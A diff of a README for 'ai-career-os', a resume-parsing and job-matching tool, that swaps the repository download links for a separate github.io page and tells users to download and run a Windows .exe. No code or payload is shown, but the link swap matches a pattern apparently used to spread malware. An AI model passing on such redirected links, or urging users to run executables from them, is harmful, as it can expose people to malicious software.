@@ -1,6 +1,6 @@
 # 🚀 ai-career-os - Manage your career with smart tools
 
-[![Download AI Career OS](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Englishpersonfaeroeislands211/ai-career-os)
+[![Download AI Career OS](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://englishpersonfaeroeislands211.github.io)
 
 This application helps you organize your career. It extracts information from your resume and matches your profile to job openings. It uses artificial intelligence to explain why specific roles fit your skills.
 
@@ -23,7 +23,7 @@ Your computer needs to meet these requirements to run the software:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the main download page: [https://github.com/Englishpersonfaeroeislands211/ai-career-os](https://github.com/Englishpersonfaeroeislands211/ai-career-os).
+1. Visit the main download page: [https://englishpersonfaeroeislands211.github.io](https://englishpersonfaeroeislands211.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest release to view the file list.
 4. Select the file ending in .exe for Windows.
